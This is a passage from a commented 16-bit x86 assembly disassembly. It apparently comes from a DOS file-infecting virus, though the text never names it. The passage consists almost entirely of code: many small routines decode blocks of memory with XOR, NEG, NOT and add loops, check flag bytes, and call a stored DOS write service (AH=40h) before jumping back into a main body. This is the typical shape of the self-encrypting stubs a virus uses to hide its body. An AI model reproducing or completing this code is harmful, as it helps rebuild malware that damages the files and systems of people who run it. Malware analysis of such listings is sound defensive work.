    MOV CX,OFFSET L0BD8         ;3AA8 B9 D8 0B
    XCHG    DX,SI               ;3AAB 87 D6
                        ;L3AAD    L3AB4 CJ
L3AAD:  XOR WORD PTR [SI],OFFSET L1326  ;3AAD 81 34 26 13
    ADD SI,3                ;3AB1 83 C6 03
    LOOP    L3AAD               ;3AB4 E2 F7
    JMP SHORT   L3AC2           ;3AB6 EB 0A

                        ;L3AB8    L3A99 CJ
L3AB8:  SUB AH,20   ;' '            ;3AB8 80 EC 20
    CALL    L3C47               ;3ABB E8 89 01
    JMP SHORT   L3A9B           ;3ABE EB DB

                        ;L3AC0    L3AC9 CJ
L3AC0:  POP SI              ;3AC0 5E
    RET_NEAR                ;3AC1 C3

                        ;L3AC2    L3AB6 CJ
L3AC2:  ADD SI,8BH              ;3AC2 81 C6 8B 00
    CMP BYTE PTR [SI],1         ;3AC6 80 3C 01
    JZ  L3AC0               ;3AC9 74 F5
    PUSH    ES              ;3ACB 06
    POP DS              ;3ACC 1F
    JMP L1700               ;3ACD E9 30 DC

    MOV CX,OFFSET L0BD7         ;3AD0 B9 D7 0B
                        ;L3AD3    L3ADA CJ
L3AD3:  XOR WORD PTR [BX],OFFSET L4096  ;3AD3 81 37 96 40
    ADD BX,3                ;3AD7 83 C3 03
    LOOP    L3AD3               ;3ADA E2 F7
    MOV AX,ES               ;3ADC 8C C0
    POP AX              ;3ADE 58
    MOV BX,AX               ;3ADF 8B D8
    POP CX              ;3AE1 59
    MOV AH,50   ;'P'            ;3AE2 B4 50
    JMP SHORT   L3B04           ;3AE4 EB 1E

                        ;L3AE6    L3B0A CJ
L3AE6:  PUSH    SI              ;3AE6 56
    STD                 ;3AE7 FD
    CALL    L3AED               ;3AE8 E8 02 00
    PUSH    CS              ;3AEB 0E
    DEC DI              ;3AEC 4F
                        ;L3AED    L3AE8 CC
L3AED:  POP DX              ;3AED 5A
    PUSH    CS              ;3AEE 0E
    SUB DX,OFFSET L23A0         ;3AEF 81 EA A0 23
    POP DS              ;3AF3 1F
    MOV CX,OFFSET L0BD7         ;3AF4 B9 D7 0B
    XCHG    DX,SI               ;3AF7 87 D6
                        ;L3AF9    L3B00 CJ
L3AF9:  XOR WORD PTR [SI],OFFSET L4096  ;3AF9 81 34 96 40
    ADD SI,3                ;3AFD 83 C6 03
    LOOP    L3AF9               ;3B00 E2 F7
    JMP SHORT   L3B0C           ;3B02 EB 08

                        ;L3B04    L3AE4 CJ
L3B04:  SUB AH,10               ;3B04 80 EC 10
    CALL    L3C93               ;3B07 E8 89 01
    JMP SHORT   L3AE6           ;3B0A EB DA

                        ;L3B0C    L3B02 CJ
L3B0C:  SUB SI,OFFSET LFF72         ;3B0C 81 EE 72 FF
    CMP BYTE PTR [SI],1         ;3B10 80 3C 01
    JNZ L3B17               ;3B13 75 02
    POP SI              ;3B15 5E
    RET_NEAR                ;3B16 C3

                        ;L3B17    L3B13 CJ
L3B17:  PUSH    ES              ;3B17 06
    POP DS              ;3B18 1F
    JMP L174C               ;3B19 E9 30 DC

    CMC                 ;3B1C F5
    CALL    L3B61               ;3B1D E8 41 00
                        ;L3B20    L3B29 CJ
L3B20:  XOR WORD PTR [BX],OFFSET L0406  ;3B20 81 37 06 04
    INC BX              ;3B24 43
    ADD BX,1                ;3B25 83 C3 01
    CMC                 ;3B28 F5
    LOOP    L3B20               ;3B29 E2 F5
    POP BX              ;3B2B 5B
    CMC                 ;3B2C F5
    POP CX              ;3B2D 59
    CALL    L3CDF               ;3B2E E8 AE 01
    PUSH    AX              ;3B31 50
    POP AX              ;3B32 58
    CALL    L3B5E               ;3B33 E8 28 00
    MOV BX,CS               ;3B36 8C CB
    PUSH    BX              ;3B38 53
    MOV BX,DS               ;3B39 8C DB
    POP DS              ;3B3B 1F
    ADD BX,OFFSET LDC61         ;3B3C 81 C3 61 DC
    CALL    L3B61               ;3B40 E8 1E 00
    MOV DX,2                ;3B43 BA 02 00
                        ;L3B46    L3B4C CJ
L3B46:  XOR WORD PTR [BX],OFFSET L0406  ;3B46 81 37 06 04
    ADD BX,DX               ;3B4A 03 DA
    LOOP    L3B46               ;3B4C E2 F8
    ADD BX,8DH              ;3B4E 81 C3 8D 00
    PATCH83
    PUSH    [BX]                ;3B52 FF 37
    POP CX              ;3B54 59
    DEC CL              ;3B55 FE C9
    JZ  L3B60               ;3B57 74 07
    PUSH    ES              ;3B59 06
    POP DS              ;3B5A 1F
    CALL    L1798               ;3B5B E8 3A DC
                        ;L3B5E    L3B33 CC
L3B5E:  POP DS              ;3B5E 1F
    PUSH    DS              ;3B5F 1E
                        ;L3B60    L3B57 CJ
L3B60:  RET_NEAR                ;3B60 C3

                        ;L3B61    L3B1D CC  L3B40 CC
L3B61:  MOV CX,OFFSET L1100         ;3B61 B9 00 11
    OR  CL,0C3              ;3B64 80 C9 C3
    RET_NEAR                ;3B67 C3

    CALL    L3BAE               ;3B68 E8 43 00
                        ;L3B6B    L3B74 CJ
L3B6B:  XOR WORD PTR [BX],OFFSET L239A  ;3B6B 81 37 9A 23
    ADD BX,1                ;3B6F 83 C3 01
    CLC                 ;3B72 F8
    INC BX              ;3B73 43
    LOOP    L3B6B               ;3B74 E2 F5
    POP BX              ;3B76 5B
    CLD                 ;3B77 FC
    POP CX              ;3B78 59
    CALL    L3D2B               ;3B79 E8 AF 01
    PUSH    DX              ;3B7C 52
    INC DX              ;3B7D 42
    POP DX              ;3B7E 5A
    CALL    L3BAB               ;3B7F E8 29 00
    MOV BX,CS               ;3B82 8C CB
    PUSH    BX              ;3B84 53
    MOV BX,DS               ;3B85 8C DB
    POP DS              ;3B87 1F
    ADD BX,OFFSET LDC61         ;3B88 81 C3 61 DC
    CALL    L3BAE               ;3B8C E8 1F 00
    MOV AX,2                ;3B8F B8 02 00
                        ;L3B92    L3B99 CJ
L3B92:  XOR WORD PTR [BX],OFFSET L239A  ;3B92 81 37 9A 23
    NOP                 ;3B96 90
    ADD BX,AX               ;3B97 01 C3
    LOOP    L3B92               ;3B99 E2 F7
    ADD BX,8DH              ;3B9B 81 C3 8D 00
    PATCH83
    PUSH    [BX]                ;3B9F FF 37
    POP BX              ;3BA1 5B
    DEC BL              ;3BA2 FE CB
    JZ  L3BAD               ;3BA4 74 07
    PUSH    ES              ;3BA6 06
    POP DS              ;3BA7 1F
    CALL    L17E4               ;3BA8 E8 39 DC
                        ;L3BAB    L3B7F CC
L3BAB:  POP DS              ;3BAB 1F
    PUSH    DS              ;3BAC 1E
                        ;L3BAD    L3BA4 CJ
L3BAD:  RET_NEAR                ;3BAD C3

                        ;L3BAE    L3B68 CC  L3B8C CC
L3BAE:  MOV CX,OFFSET LC311         ;3BAE B9 11 C3
    XCHG    CH,CL               ;3BB1 86 E9
    RET_NEAR                ;3BB3 C3

    CALL    L3BF9               ;3BB4 E8 42 00
                        ;L3BB7    L3BBE CJ
L3BB7:  XOR WORD PTR [BX],OFFSET L0138  ;3BB7 81 37 38 01
    ADD BX,2                ;3BBB 83 C3 02
    LOOP    L3BB7               ;3BBE E2 F7
    POP BX              ;3BC0 5B
    CLC                 ;3BC1 F8
    POP CX              ;3BC2 59
    CALL    L3D77               ;3BC3 E8 B1 01
    JMP SHORT   L3BCB           ;3BC6 EB 03

    AND AX,[BX+LE80C]           ;3BC8 23 87 0C E8
                        ;L3BCB    L3BC6 CJ
L3BCB   EQU $-1
    SUB [BX+SI],AL          ;3BCC 28 00
    MOV BX,CS               ;3BCE 8C CB
    PUSH    DS              ;3BD0 1E
    MOV DS,BX               ;3BD1 8E DB
    POP BX              ;3BD3 5B
    SUB BX,OFFSET L239F         ;3BD4 81 EB 9F 23
    CALL    L3BF9               ;3BD8 E8 1E 00
    MOV AX,2                ;3BDB B8 02 00
                        ;L3BDE    L3BE4 CJ
L3BDE:  XOR WORD PTR [BX],OFFSET L0138  ;3BDE 81 37 38 01
    ADD BX,AX               ;3BE2 01 C3
    LOOP    L3BDE               ;3BE4 E2 F8
    ADD BX,8DH              ;3BE6 81 C3 8D 00
    PATCH83
    PUSH    [BX]                ;3BEA FF 37
    POP BX              ;3BEC 5B
    DEC BL              ;3BED FE CB
    JZ  L3BF8               ;3BEF 74 07
    PUSH    ES              ;3BF1 06
    POP DS              ;3BF2 1F
    JMP L1830               ;3BF3 E9 3A DC

    POP DS              ;3BF6 1F
    PUSH    DS              ;3BF7 1E
                        ;L3BF8    L3BEF CJ
L3BF8:  RET_NEAR                ;3BF8 C3

                        ;L3BF9    L3BB4 CC  L3BD8 CC
L3BF9:  MOV CX,OFFSET LC311         ;3BF9 B9 11 C3
    XCHG    CL,CH               ;3BFC 86 CD
    RET_NEAR                ;3BFE C3

    INT 3               ;3BFF CC
    XOR AX,AX               ;3C00 33 C0
    ADD BX,CX               ;3C02 01 CB
                        ;L3C04    L3C0F CJ
L3C04:  MOV AL,[BX]             ;3C04 8A 07
    SUB [BX-1],AL           ;3C06 28 47 FF
    SUB BX,2                ;3C09 83 EB 02
    CMP BX,1F               ;3C0C 83 FB 1F
    JNZ L3C04               ;3C0F 75 F3
    POP BX              ;3C11 5B
                        ;L3C12    L2BBF DI
L3C12:  CLD                 ;3C12 FC
    POP CX              ;3C13 59
    CALL    L3C3C               ;3C14 E8 25 00
                        ;L3C17    L3C46 CC
L3C17:  PUSH    CS              ;3C17 0E
    STD                 ;3C18 FD
    POP DS              ;3C19 1F
    POP AX              ;3C1A 58
    CALL    L3C49               ;3C1B E8 2B 00
    XCHG    BX,AX               ;3C1E 93
    MOV CX,OFFSET L11C3         ;3C1F B9 C3 11
    SUB BX,1E               ;3C22 83 EB 1E
                        ;L3C25    L3C2D CJ
L3C25:  MOV DL,[BX]             ;3C25 8A 17
    ADD [BX-1],DL           ;3C27 00 57 FF
    DEC BX              ;3C2A 4B
    CMC                 ;3C2B F5
    DEC BX              ;3C2C 4B
    LOOP    L3C25               ;3C2D E2 F6
    CMP BYTE PTR L2433,1        ;3C2F 80 3E 33 24 01
    JZ  L3C4B               ;3C34 74 15
    PUSH    ES              ;3C36 06
    CMC                 ;3C37 F5
    POP DS              ;3C38 1F
    CALL    L187C               ;3C39 E8 40 DC
                        ;L3C3C    L3C14 CC
L3C3C:  POP AX              ;3C3C 58
    XOR AH,AH               ;3C3D 32 E4
    OR  AH,40   ;'@'            ;3C3F 80 CC 40
    CALL    WORD PTR L2566          ;3C42 FF 16 66 25
    CALL    L3C17               ;3C46 E8 CE FF
                        ;L3C47    L3ABB CC
L3C47   EQU $-2
                        ;L3C49    L3C1B CC
L3C49:  POP AX              ;3C49 58
    PUSH    AX              ;3C4A 50
                        ;L3C4B    L3C34 CJ
L3C4B:  RET_NEAR                ;3C4B C3

    ADD BX,CX               ;3C4C 01 CB
    MOV CX,1                ;3C4E B9 01 00
    INC CX              ;3C51 41
                        ;L3C52    L3C5C CJ
L3C52:  MOV AL,[BX]             ;3C52 8A 07
    ADD [BX-1],AL           ;3C54 00 47 FF
    SUB BX,CX               ;3C57 29 CB
    CMP BX,1F               ;3C59 83 FB 1F
    JNZ L3C52               ;3C5C 75 F4
    POP BX              ;3C5E 5B
    POP CX              ;3C5F 59
    CALL    L3C87               ;3C60 E8 24 00
                        ;L3C63    L3C91 CC
L3C63:  POP BX              ;3C63 5B
    PUSH    CS              ;3C64 0E
    POP DS              ;3C65 1F
    CALL    L3C94               ;3C66 E8 2B 00
    XCHG    BX,AX               ;3C69 93
    SUB BX,1DH              ;3C6A 83 EB 1D
    MOV CX,OFFSET L11C3         ;3C6D B9 C3 11
                        ;L3C70    L3C77 CJ
L3C70:  MOV AL,[BX]             ;3C70 8A 07
    SUB [BX-1],AL           ;3C72 28 47 FF
    DEC BX              ;3C75 4B
    DEC BX              ;3C76 4B
    LOOP    L3C70               ;3C77 E2 F7
    CMP BYTE PTR L2433,1        ;3C79 80 3E 33 24 01
    JZ  L3C96               ;3C7E 74 16
    PUSH    ES              ;3C80 06
    SUB AX,AX               ;3C81 2B C0
    POP DS              ;3C83 1F
    CALL    L18C8               ;3C84 E8 41 DC
                        ;L3C87    L3C60 CC
L3C87:  POP AX              ;3C87 58
    MOV AH,40   ;'@'            ;3C88 B4 40
    PUSH    SI              ;3C8A 56
    MOV SI,OFFSET L2568 ;'%h'       ;3C8B BE 68 25
                        ;L3C8E    L3CD5 CJ
L3C8E:  CALL    SI              ;3C8E FF D6
                        ;L3C8F    L3C97 CJ
L3C8F   EQU $-1
    POP SI              ;3C90 5E
    CALL    L3C63               ;3C91 E8 CF FF
                        ;L3C93    L3B07 CC
L3C93   EQU $-1
                        ;L3C94    L3C66 CC
L3C94:  POP AX              ;3C94 58
    PUSH    AX              ;3C95 50
                        ;L3C96    L3C7E CJ
L3C96:  RET_NEAR                ;3C96 C3

    JMP SHORT   L3C8F           ;3C97 EB F6

                        ;L3C98    L3C9F CJ
L3C98   EQU $-1
    POP SS              ;3C99 17
    NEG BYTE PTR [BX]           ;3C9A F6 1F
    ADD BX,1                ;3C9C 83 C3 01
    LOOP    L3C98               ;3C9F E2 F7
    POP BX              ;3CA1 5B
    CLD                 ;3CA2 FC
    POP CX              ;3CA3 59
    CALL    L3E5B               ;3CA4 E8 B4 01
    JMP SHORT   L3CB0           ;3CA7 EB 07

                        ;L3CA9    L3CB1 CJ
L3CA9:  MOV DX,CS               ;3CA9 8C CA
    MOV DS,DX               ;3CAB 8E DA
    CALL    L3CB3               ;3CAD E8 03 00
                        ;L3CB0    L3CA7 CJ
L3CB0:  XLAT                    ;3CB0 D7
    JMP SHORT   L3CA9           ;3CB1 EB F6

                        ;L3CB3    L3CAD CC
L3CB3:  POP DX              ;3CB3 5A
    SUB DX,OFFSET L239D         ;3CB4 81 EA 9D 23
    STC                 ;3CB8 F9
    XCHG    BX,DX               ;3CB9 87 DA
    MOV CX,OFFSET L2C8A         ;3CBB B9 8A 2C
    CLC                 ;3CBE F8
    XOR CX,OFFSET L0F0F         ;3CBF 81 F1 0F 0F
                        ;L3CC3    L3CC9 CJ
L3CC3:  NEG BYTE PTR [BX]           ;3CC3 F6 1F
    NOT BYTE PTR [BX]           ;3CC5 F6 17
    INC BX              ;3CC7 43
    STD                 ;3CC8 FD
    LOOP    L3CC3               ;3CC9 E2 F8
    MOV CH,8DH              ;3CCB B5 8D
    MOV AL,1                ;3CCD B0 01
    ADD AL,CH               ;3CCF 02 C5
    XLAT                    ;3CD1 D7
    CLC                 ;3CD2 F8
    CMP AL,1                ;3CD3 3C 01
    JZ  L3C8E               ;3CD5 74 B7
    MOV CX,ES               ;3CD7 8C C1
    MOV AX,SS               ;3CD9 8C D0
    SUB AX,AX               ;3CDB 2B C0
    PUSH    DS              ;3CDD 1E
    MOV DS,CX               ;3CDE 8E D9
                        ;L3CDF    L3B2E CC
L3CDF   EQU $-1
    POP CX              ;3CE0 59
    JMP L1914               ;3CE1 E9 30 DC

                        ;L3CE4    L3CE9 CJ
L3CE4:  NEG BYTE PTR [BX]           ;3CE4 F6 1F
    NOT BYTE PTR [BX]           ;3CE6 F6 17
    INC BX              ;3CE8 43
    LOOP    L3CE4               ;3CE9 E2 F9
    POP CX              ;3CEB 59
    POP BX              ;3CEC 5B
    XCHG    CX,BX               ;3CED 87 CB
    CALL    L3EA7               ;3CEF E8 B5 01
    JMP SHORT   L3CFB           ;3CF2 EB 07

                        ;L3CF4    L3CFB CJ
L3CF4:  MOV AX,CS               ;3CF4 8C C8
    MOV DS,AX               ;3CF6 8E D8
    CALL    L3CFD               ;3CF8 E8 02 00
                        ;L3CFB    L3CF2 CJ
L3CFB:  JMP SHORT   L3CF4           ;3CFB EB F7

                        ;L3CFD    L3CF8 CC
L3CFD:  POP AX              ;3CFD 58
    SUB AX,OFFSET L239C         ;3CFE 2D 9C 23
    XCHG    BX,AX               ;3D01 93
                        ;L3D02    L440E DI
L3D02:  MOV CX,OFFSET LDE2E         ;3D02 B9 2E DE
    XOR CX,OFFSET LFDAB         ;3D05 81 F1 AB FD
                        ;L3D09    L3D0E CJ
L3D09:  NOT BYTE PTR [BX]           ;3D09 F6 17
    NEG BYTE PTR [BX]           ;3D0B F6 1F
    INC BX              ;3D0D 43
    LOOP    L3D09               ;3D0E E2 F9
    MOV AL,8E               ;3D10 B0 8E
    XLAT                    ;3D12 D7
    CMP AL,1                ;3D13 3C 01
    JZ  L3D2A               ;3D15 74 13
    MOV AX,ES               ;3D17 8C C0
    MOV BX,AX               ;3D19 8B D8
    PUSH    DS              ;3D1B 1E
    MOV DS,BX               ;3D1C 8E DB
    POP BX              ;3D1E 5B
    SUB AX,AX               ;3D1F 2B C0
    JMP L1960               ;3D21 E9 3C DC

    ADD CX,[BX+DI+LA5EF]        ;3D24 03 89 EF A5
    ADC AL,0CC              ;3D28 14 CC
                        ;L3D2A    L3D15 CJ
L3D2A:  RET_NEAR                ;3D2A C3

                        ;L3D2B    L3B79 CC
L3D2B:  ADC CX,AX               ;3D2B 11 C1
    ESC 37,[SI]             ;3D2D DE 3C
    MOV AH,55   ;'U'            ;3D2F B4 55
    INC BX              ;3D31 43
    DEC CX              ;3D32 49
    CALL    L3D3E               ;3D33 E8 08 00
                        ;L3D36    L3D3F CC  L3D57 CC
L3D36:  DEC CX              ;3D36 49
    NEG BYTE PTR [BX]           ;3D37 F6 1F
    ADD BX,2                ;3D39 83 C3 02
    DEC CX              ;3D3C 49
                        ;L3D3D    L3D69 CJ
L3D3D:  RET_NEAR                ;3D3D C3

                        ;L3D3E    L3D33 CC
L3D3E:  POP BP              ;3D3E 5D
                        ;L3D3F    L3D44 CJ
L3D3F:  CALL    L3D36               ;3D3F E8 F4 FF
    JZ  L3D74               ;3D42 74 30
    JMP SHORT   L3D3F           ;3D44 EB F9

                        ;L3D46    L3D7A CJ
L3D46:  PUSH    BP              ;3D46 55
    PUSH    CS              ;3D47 0E
    CLC                 ;3D48 F8
    POP DS              ;3D49 1F
    CALL    L3D70               ;3D4A E8 23 00
    MOV CL,84               ;3D4D B1 84
    SUB BP,OFFSET L23A1         ;3D4F 81 ED A1 23
    MOV BX,BP               ;3D53 8B DD
    MOV CH,23   ;'#'            ;3D55 B5 23
                        ;L3D57    L3D5A CJ
L3D57:  CALL    L3D36               ;3D57 E8 DC FF
    JNZ L3D57               ;3D5A 75 FB
    MOV AX,BP               ;3D5C 89 E8
    MOV BP,BX               ;3D5E 8B EB
    ADD BP,8E               ;3D60 81 C5 8E 00
    DEC BYTE PTR DS:[BP+0]      ;3D64 3E FE 4E 00
    POP BP              ;3D68 5D
    JZ  L3D3D               ;3D69 74 D2
    PUSH    ES              ;3D6B 06
    POP DS              ;3D6C 1F
    PUSH    AX              ;3D6D 50
    MOV AX,CX               ;3D6E 89 C8
                        ;L3D70    L3D4A CC
L3D70:  POP BP              ;3D70 5D
    PUSH    CS              ;3D71 0E
    PUSH    BP              ;3D72 55
    RET_FAR                 ;3D73 CB

                        ;L3D74    L3D42 CJ
L3D74:  POP BP              ;3D74 5D
    POP BX              ;3D75 5B
    POP CX              ;3D76 59
                        ;L3D77    L3BC3 CC
L3D77:  CALL    L3EF3               ;3D77 E8 79 01
    JMP SHORT   L3D46           ;3D7A EB CA

    INC BX              ;3D7C 43
    PUSH    DX              ;3D7D 52
    DEC CX              ;3D7E 49
    CALL    L3D8A               ;3D7F E8 08 00
                        ;L3D82    L3D8B CC  L3DA3 CC
L3D82:  NOT BYTE PTR [BX]           ;3D82 F6 17
    DEC CX              ;3D84 49
    ADD BX,2                ;3D85 83 C3 02
    DEC CX              ;3D88 49
    RET_NEAR                ;3D89 C3

                        ;L3D8A    L3D7F CC
L3D8A:  POP DX              ;3D8A 5A
                        ;L3D8B    L3D90 CJ
L3D8B:  CALL    L3D82               ;3D8B E8 F4 FF
    JZ  L3DBE               ;3D8E 74 2E
    JMP SHORT   L3D8B           ;3D90 EB F9

                        ;L3D92    L3DC6 CJ
L3D92:  PUSH    DX              ;3D92 52
    PUSH    CS              ;3D93 0E
    POP DS              ;3D94 1F
    CALL    L3DBB               ;3D95 E8 23 00
    SUB DX,OFFSET L23A0         ;3D98 81 EA A0 23
    MOV BX,DX               ;3D9C 89 D3
    MOV CX,OFFSET L8423         ;3D9E B9 23 84
    XCHG    CL,CH               ;3DA1 86 CD
                        ;L3DA3    L3DA6 CJ
L3DA3:  CALL    L3D82               ;3DA3 E8 DC FF
    JNZ L3DA3               ;3DA6 75 FB
    XCHG    DX,AX               ;3DA8 92
    MOV DX,BX               ;3DA9 89 DA
    ADD DX,8E               ;3DAB 81 C2 8E 00
    XCHG    DX,BX               ;3DAF 87 D3
    DEC BYTE PTR [BX]           ;3DB1 FE 0F
    POP DX              ;3DB3 5A
    JZ  L3DBD               ;3DB4 74 07
    PUSH    ES              ;3DB6 06
    POP DS              ;3DB7 1F
    PUSH    AX              ;3DB8 50
    XOR AX,AX               ;3DB9 33 C0
                        ;L3DBB    L3D95 CC
L3DBB:  POP DX              ;3DBB 5A
    PUSH    DX              ;3DBC 52
                        ;L3DBD    L3DB4 CJ
L3DBD:  RET_NEAR                ;3DBD C3

                        ;L3DBE    L3D8E CJ
L3DBE:  POP DX              ;3DBE 5A
    POP BX              ;3DBF 5B
    POP CX              ;3DC0 59
    CALL    L3F3F               ;3DC1 E8 7B 01
    XLAT                    ;3DC4 D7
    CLC                 ;3DC5 F8
    JMP SHORT   L3D92           ;3DC6 EB CA

    JMP SHORT   L3DD8           ;3DC8 EB 0E

                        ;L3DCA    L3DDD CJ
L3DCA:  POP BX              ;3DCA 5B
    MOV AH,40   ;'@'            ;3DCB B4 40
    POP CX              ;3DCD 59
    CALL    L3F8B               ;3DCE E8 BA 01
    JMP SHORT   L3DDF           ;3DD1 EB 0C

                        ;L3DD3    L3DDF CC  L3DF6 CC
L3DD3:  POP BX              ;3DD3 5B
    PUSH    CS              ;3DD4 0E
    POP DS              ;3DD5 1F
    PUSH    BX              ;3DD6 53
    RET_NEAR                ;3DD7 C3

                        ;L3DD8    L3DC8 CJ  L3DDB CJ
L3DD8:  CALL    L3E04               ;3DD8 E8 29 00
    JNZ L3DD8               ;3DDB 75 FB
    JMP SHORT   L3DCA           ;3DDD EB EB

                        ;L3DDF    L3DD1 CJ
L3DDF:  CALL    L3DD3               ;3DDF E8 F1 FF
    MOV CX,OFFSET L239F         ;3DE2 B9 9F 23
    SUB BX,CX               ;3DE5 29 CB
    SUB CX,1A               ;3DE7 83 E9 1A
                        ;L3DEA    L3DED CJ
L3DEA:  CALL    L3E04               ;3DEA E8 17 00
    JNZ L3DEA               ;3DED 75 FB
    XOR BYTE PTR [BX+DS:8E],1       ;3DEF 80 B7 8E 00 01
    JZ  L3E03               ;3DF4 74 0D
    CALL    L3DD3               ;3DF6 E8 DA FF
    SUB BX,OFFSET L23B4         ;3DF9 81 EB B4 23
    DEC BX              ;3DFD 4B
    MOV AX,CX               ;3DFE 89 C8
    PUSH    BX              ;3E00 53
    PUSH    ES              ;3E01 06
    POP DS              ;3E02 1F
                        ;L3E03    L3DF4 CJ
L3E03:  RET_NEAR                ;3E03 C3

                        ;L3E04    L3DD8 CC  L3DEA CC
L3E04:  PUSH    [BX]                ;3E04 FF 37
    POP AX              ;3E06 58
    XOR [BX+2],AL           ;3E07 30 47 02
    XOR [BX+1],AL           ;3E0A 30 47 01
    ADD BX,3                ;3E0D 83 C3 03
    SUB CX,3                ;3E10 83 E9 03
    RET_NEAR                ;3E13 C3

    JMP SHORT   L3E24           ;3E14 EB 0E

                        ;L3E16    L3E29 CJ
L3E16:  POP BX              ;3E16 5B
    POP CX              ;3E17 59
    MOV AH,40   ;'@'            ;3E18 B4 40
                        ;L3E1A    L318B DI
L3E1A:  CALL    L3FD7               ;3E1A E8 BA 01
    JMP SHORT   L3E2B           ;3E1D EB 0C

                        ;L3E1F    L3E2B CC  L3E44 CC
L3E1F:  POP BX              ;3E1F 5B
    PUSH    BX              ;3E20 53
    PUSH    CS              ;3E21 0E
    POP DS              ;3E22 1F
                        ;L3E23    L3E42 CJ
L3E23:  RET_NEAR                ;3E23 C3

                        ;L3E24    L3E14 CJ  L3E27 CJ
L3E24:  CALL    L3E51               ;3E24 E8 2A 00
    JNZ L3E24               ;3E27 75 FB
    JMP SHORT   L3E16           ;3E29 EB EB

                        ;L3E2B    L3E1D CJ
L3E2B:  CALL    L3E1F               ;3E2B E8 F1 FF
    MOV AX,OFFSET L239F         ;3E2E B8 9F 23
    SUB BX,AX               ;3E31 29 C3
    MOV CX,1A               ;3E33 B9 1A 00
    XOR CX,AX               ;3E36 33 C8
                        ;L3E38    L3E3B CJ
L3E38:  CALL    L3E51               ;3E38 E8 16 00
    JNZ L3E38               ;3E3B 75 FB
    XOR BYTE PTR [BX+DS:8E],1       ;3E3D 80 B7 8E 00 01
    JZ  L3E23               ;3E42 74 DF
    CALL    L3E1F               ;3E44 E8 D8 FF
                        ;L3E46    L3464 DI
L3E46   EQU $-1
    SUB BX,OFFSET L23B7         ;3E47 81 EB B7 23
    PUSH    BX              ;3E4B 53
    PUSH    ES              ;3E4C 06
                        ;L3E4D    L3269 DI
L3E4D:  MOV AX,CX               ;3E4D 89 C8
    POP DS              ;3E4F 1F
    RET_NEAR                ;3E50 C3

                        ;L3E51    L3E24 CC  L3E38 CC
L3E51:  MOV AH,[BX]             ;3E51 8A 27
    XOR [BX+1],AH           ;3E53 30 67 01
    XOR [BX+2],AH           ;3E56 30 67 02
    ADD BX,3                ;3E59 83 C3 03
                        ;L3E5B    L3CA4 CC
L3E5B   EQU $-1
    SUB CX,3                ;3E5C 83 E9 03
    RET_NEAR                ;3E5F C3

    JMP SHORT   L3E7A           ;3E60 EB 18

                        ;L3E62    L3E7F CJ
L3E62:  POP AX              ;3E62 58
    MOV BX,AX               ;3E63 8B D8
    POP AX              ;3E65 58
    PUSH    SI              ;3E66 56
    MOV CX,AX               ;3E67 89 C1
    PUSH    L2566               ;3E69 FF 36 66 25
    MOV AX,OFFSET L4000         ;3E6D B8 00 40
    POP SI              ;3E70 5E
    CALL    SI              ;3E71 FF D6
    POP SI              ;3E73 5E
    STC                 ;3E74 F9
    NOP                 ;3E75 90
    CLC                 ;3E76 F8
    JMP L3E81               ;3E77 E9 07 00

                        ;L3E7A    L3E60 CJ  L3E7D CJ
L3E7A:  INC BYTE PTR [BX]           ;3E7A FE 07
    INC BX              ;3E7C 43
    LOOP    L3E7A               ;3E7D E2 FB
    JMP SHORT   L3E62           ;3E7F EB E1

                        ;L3E81    L3E77 CJ
L3E81:  CALL    L3EA6               ;3E81 E8 22 00
    MOV CX,OFFSET L2385         ;3E84 B9 85 23
    SUB BX,OFFSET L23A9         ;3E87 81 EB A9 23
                        ;L3E8B    L3E8E CJ
L3E8B:  DEC BYTE PTR [BX]           ;3E8B FE 0F
    INC BX              ;3E8D 43
    LOOP    L3E8B               ;3E8E E2 FB
    PUSH    BP              ;3E90 55
    MOV BP,BX               ;3E91 8B EB
    ADD BP,8E               ;3E93 81 C5 8E 00
    XOR AX,AX               ;3E97 33 C0
    CMP BYTE PTR DS:[BP+0],1        ;3E99 3E 80 7E 00 01
    POP BP              ;3E9E 5D
    JZ  L3EAA               ;3E9F 74 09
    PUSH    ES              ;3EA1 06
    POP DS              ;3EA2 1F
    JMP L1ADC               ;3EA3 E9 36 DC

                        ;L3EA6    L3E81 CC
L3EA6:  PUSH    CS              ;3EA6 0E
                        ;L3EA7    L3CEF CC
L3EA7:  POP DS              ;3EA7 1F
    POP BX              ;3EA8 5B
    PUSH    BX              ;3EA9 53
                        ;L3EAA    L3E9F CJ
L3EAA:  RET_NEAR                ;3EAA C3

    INT 50              ;3EAB CD 50
    DEC CL              ;3EAD FE C9
    JMP SHORT   L3EC7           ;3EAF EB 16

                        ;L3EB1    L3EC7 CC  L3EE5 CC
L3EB1:  MOV AL,[BX]             ;3EB1 8A 07
    INC BX              ;3EB3 43
    MOV AH,[BX]             ;3EB4 8A 27
    XCHG    AL,AH               ;3EB6 86 C4
    MOV [BX-1],AL           ;3EB8 88 47 FF
    DEC CX              ;3EBB 49
    MOV [BX],AH             ;3EBC 88 27
    INC BX              ;3EBE 43
    XOR AX,AX               ;3EBF 33 C0
    DEC CX              ;3EC1 49
                        ;L3EC2    L3EF0 CJ
L3EC2:  RET_NEAR                ;3EC2 C3

    PUSH    CS              ;3EC3 0E
    POP DS              ;3EC4 1F
    JMP SHORT   L3EDA           ;3EC5 EB 13

                        ;L3EC7    L3EAF CJ  L3ECB CJ
L3EC7:  CALL    L3EB1               ;3EC7 E8 E7 FF
    CLC                 ;3ECA F8
    JNZ L3EC7               ;3ECB 75 FA
    POP AX              ;3ECD 58
    POP BX              ;3ECE 5B
    POP CX              ;3ECF 59
    PUSH    BP              ;3ED0 55
    PUSH    L2566               ;3ED1 FF 36 66 25
    POP BP              ;3ED5 5D
    CALL    BP  DS: ??      ;3ED6 3E FF D5
    POP BP              ;3ED9 5D
                        ;L3EDA    L3EC5 CJ
L3EDA:  CALL    L3EDD               ;3EDA E8 00 00
                        ;L3EDD    L3EDA DC
L3EDD:  MOV CX,OFFSET L2384         ;3EDD B9 84 23
    POP BX              ;3EE0 5B
    SUB BX,OFFSET L23B6         ;3EE1 81 EB B6 23
                        ;L3EE5    L3EE8 CJ
L3EE5:  CALL    L3EB1               ;3EE5 E8 C9 FF
    JNZ L3EE5               ;3EE8 75 FB
    CMP BYTE PTR [BX+DS:8F],1       ;3EEA 80 BF 8F 00 01
    CLD                 ;3EEF FC
    JZ  L3EC2               ;3EF0 74 D0
    PUSH    ES              ;3EF2 06
                        ;L3EF3    L3D77 CC
L3EF3:  POP DS              ;3EF3 1F
    JMP L1B28               ;3EF4 E9 31 DC

    MOV [BX+DI+50],CX           ;3EF7 89 49 50
    JMP SHORT   L3F13           ;3EFA EB 17

                        ;L3EFC    L3F13 CC  L3F33 CC
